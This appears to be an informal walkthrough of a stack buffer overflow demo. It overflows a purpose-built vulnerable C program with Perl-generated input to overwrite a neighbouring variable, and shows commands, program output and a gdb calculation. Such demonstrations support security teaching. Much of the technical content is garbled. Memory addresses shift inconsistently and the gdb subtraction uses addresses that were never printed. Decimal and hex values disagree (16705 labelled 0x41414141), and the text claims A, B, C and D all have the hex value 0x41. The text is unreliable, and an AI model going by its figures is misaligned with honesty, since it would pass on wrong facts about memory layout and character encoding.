 #cd Desktop
#gcc -o overflow_example overflow_example.c
u can see the file 
next i am going to enter 

#./overflow_example $(perl -e 'print "A"x30')

./overflow_example $(perl -e 'print "A"x30')
[BEFORE] buffer_two is at 0x7ffd317782fc and contains 'two'
[BEFORE] buffer_one is at 0x7ffd31778304 and contains 'one'
[BEFORE] value is at 0x7ffd3177830c and is 5 (0x00000005)

[STRCPY] copying 30 bytes into buffer_two

[AFTER] buffer_two is at0x7ffd317782fc  and contains 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[AFTER] buffer_one is at 0x7ffd31778304 and contains 'AAAAAAAAAAAAAA'
[AFTER] value is at 0x7ffe4832209c and is 16705 (0x41414141)
Segmentation fault 


GDB is used as a hexadecimal calculator to figure
out the distance between buffer_two ( 0x7ffd317782fc ) and the value variable
( 0x7ffd3177830 ), which turns out to be 20 bytes.

#gdb -q
(gdb) print 0x7ffe4832209c - 0x7ffe48322080
$1 = 20
(gdb) quit

#./overflow_example $(perl -e 'print "A"x20 . "ABCD"')
[BEFORE] buffer_two is at 0x7ffa2bf218c and contains 'two'
[BEFORE] buffer_one is at 0x7ffa2bf2194 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)

[STRCPY] copying 24 bytes into buffer_two

[AFTER] buffer_two is at  0x7ffa2bf218c and contains 'AAAAAAAAAAAAAAAAAAAAABCD'
[AFTER] buffer_one is at 0x7ffa2bf2194 and contains 'AAAAAAAAAAAAABCD'
[AFTER] value is at 0xbffff7f4 and is 1145258561 (0x41414141)

finally we have removed the segmentation fault
since the characters A,
B, C, and D have the hex values of 0x41 , 0x41 , 0x41 , and 0x41 , respectively. The
first character is the least significant byte, due to the little-endian architecture
